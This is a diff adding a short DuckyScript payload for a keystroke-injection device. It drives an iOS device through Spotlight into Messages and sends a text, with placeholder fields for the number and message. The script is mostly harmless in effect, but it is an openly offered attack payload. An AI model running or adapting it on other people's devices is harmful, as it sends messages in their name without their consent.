@@ -1,0 +1,25 @@
+REM Version 1.1
+REM OS: iOS
+REM Author: White_Wid0w
+REM Description: A simple payload that sends a text message through iOS Messager
+
+
+GUI h
+DELAY 150
+GUI SPACE 
+DELAY 150
+BACKSPACE
+DELAY 150
+STRING Messages
+DELAY 250
+ENTER
+DELAY 200
+GUI n 
+DELAY 200
+STRING "PHONE NUMBER"
+DELAY 200
+TAB
+DELAY 200
+STRING "MESSAGE"
+DELAY 150
+ENTER
